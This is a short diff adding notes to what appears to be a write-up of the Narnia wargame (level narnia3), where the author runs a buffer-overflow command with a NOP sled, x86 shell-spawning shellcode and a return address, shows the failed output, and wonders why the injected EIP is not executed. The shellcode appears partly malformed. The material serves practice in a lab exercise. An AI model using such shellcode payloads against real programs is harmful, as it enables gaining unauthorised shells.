@@ -97,4 +97,12 @@ Breakpoint 1, 0x0804855f in main ()
 
 looks good...
 let's see if a shell appears...
+no luck:
+narnia3@narnia:~$ /narnia/narnia3 $(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x6889\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
+error opening 1Ph//shh/binPS̀`
+
+my guess is that the injected EIP is not being executed. but why?
+
+
+
 
